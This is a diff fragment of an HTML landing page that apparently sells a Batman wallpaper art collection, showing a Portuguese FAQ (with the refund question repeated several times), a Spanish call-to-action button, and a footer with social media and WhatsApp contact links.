+                      d="M25.7,20.5c-0.4,1.2-1.9,2.2-3.2,2.4C22.2,23,21.9,23,21.5,23c-0.8,0-2-0.2-4.1-1.1c-2.4-1-4.8-3.1-6.7-5.8 L10.7,16C10.1,15.1,9,13.4,9,11.6c0-2.2,1.1-3.3,1.5-3.8c0.5-0.5,1.2-0.8,2-0.8c0.2,0,0.3,0,0.5,0c0.7,0,1.2,0.2,1.7,1.2l0.4,0.8 c0.3,0.8,0.7,1.7,0.8,1.8c0.3,0.6,0.3,1.1,0,1.6c-0.1,0.3-0.3,0.5-0.5,0.7c-0.1,0.2-0.2,0.3-0.3,0.3c-0.1,0.1-0.1,0.1-0.2,0.2 c0.3,0.5,0.9,1.4,1.7,2.1c1.2,1.1,2.1,1.4,2.6,1.6l0,0c0.2-0.2,0.4-0.6,0.7-0.9l0.1-0.2c0.5-0.7,1.3-0.9,2.1-0.6 c0.4,0.2,2.6,1.2,2.6,1.2l0.2,0.1c0.3,0.2,0.7,0.3,0.9,0.7C26.2,18.5,25.9,19.8,25.7,20.5z"
+                    ></path>
+                  </g>
+                </svg>
+              </a>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="faq">
+        <div class="wrap">
+          <div class="section-head">
+            <span class="mono" data-i18n="faq_eyebrow"
+              >Perguntas frequentes</span
+            >
+            <h2 class="margin-tp" data-i18n="faq_title">
+              Antes de acessar o arquivo
+            </h2>
+          </div>
+          <div class="faq-list">
+            <div class="faq-item">
+              <button class="faq-q" data-i18n="faq1_q">
+                Em que formato recebo as artes? <span class="plus">+</span>
+              </button>
+              <div class="faq-a" data-i18n="faq1_a">
+                Todas as imagens vêm em JPG de alta resolução (4K), organizadas
+                por pasta de atmosfera e por proporção de tela.
+              </div>
+            </div>
+            <div class="faq-item">
+              <button class="faq-q" data-i18n="faq2_q">
+                Funciona no celular e no computador? <span class="plus">+</span>
+              </button>
+              <div class="faq-a" data-i18n="faq2_a">
+                Sim. Cada arte tem uma versão para tela de celular, uma para
+                desktop e uma para tela de bloqueio.
+              </div>
+            </div>
+            <div class="faq-item">
+              <button class="faq-q" data-i18n="faq3_q">
+                O acesso expira? <span class="plus">+</span>
+              </button>
+              <div class="faq-a" data-i18n="faq3_a">
+                Não. O pagamento é único e o download fica disponível
+                permanentemente para você.
+              </div>
+            </div>
+            <div class="faq-item">
+              <button class="faq-q" data-i18n="faq4_q">
+                Posso pedir reembolso? <span class="plus">+</span>
+              </button>
+              <div class="faq-a" data-i18n="faq4_a">
+                Sim, você tem 7 dias corridos após a compra para solicitar o
+                reembolso integral, sem perguntas.
+              </div>
+            </div>
+            <div class="faq-item">
+              <button class="faq-q" data-i18n="faq5_q">
+                Posso pedir reembolso? <span class="plus">+</span>
+              </button>
+              <div class="faq-a" data-i18n="faq5_a">
+                Sim, você tem 7 dias corridos após a compra para solicitar o
+                reembolso integral, sem perguntas.
+              </div>
+            </div>
+            <div class="faq-item">
+              <button class="faq-q" data-i18n="faq5_q">
+                Posso pedir reembolso? <span class="plus">+</span>
+              </button>
+              <div class="faq-a" data-i18n="faq5_a">
+                Sim, você tem 7 dias corridos após a compra para solicitar o
+                reembolso integral, sem perguntas.
+              </div>
+            </div>
+            <div class="faq-item">
+              <button class="faq-q" data-i18n="faq6_q">
+                Posso pedir reembolso? <span class="plus">+</span>
+              </button>
+              <div class="faq-a" data-i18n="faq6_a">
+                Sim, você tem 7 dias corridos após a compra para solicitar o
+                reembolso integral, sem perguntas.
+              </div>
+            </div>
+          </div>
+          <div class="mais_button" style="justify-content: left">
+            <a href="#preco" id="hero-cta" class="btn-primary"
+              >acceder ahora a la colección completa del batman</a
+            >
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <div class="wrap">
+        <div class="footer-row">
+          <div class="footer_image">
+            <img src="./batman_header_3.png" />
+          </div>
+          <div class="social-links">
+            <a
+              href="https://www.instagram.com/goldclipsofc?igsh=MXkwNGQwNWYwdG10"
+              data-i18n="instagram"
+              >Instagram</a
+            >
+            <a
+              href="https://www.tiktok.com/@goldclips_ofc?_r=1&_t=ZS-98o8kZOkuX6"
+              data-i18n="tiktok"
+              >TikTok</a
+            >
+            <a
+              href="https://wa.me/5524992834072?text=Me%20interesan%20los%20c%C3%B3mics%20de%20Batman%3B%20%C2%BFpodr%C3%ADas%20explicarme%20un%20poco%20m%C3%A1s%20c%C3%B3mo%20funciona%3F"
+              data-i18n="contact"
+              >Contacto</a
+            >
+          </div>
+        </div>
       </div>
-    </div>
-    </div>
-</footer>
+    </footer>
 
-<script src="enginner.js"></script>
-<script src="i18n.js"></script>
-
-</body>
+    <script src="enginner.js"></script>
+    <script src="i18n.js"></script>
+  </body>
 </html>
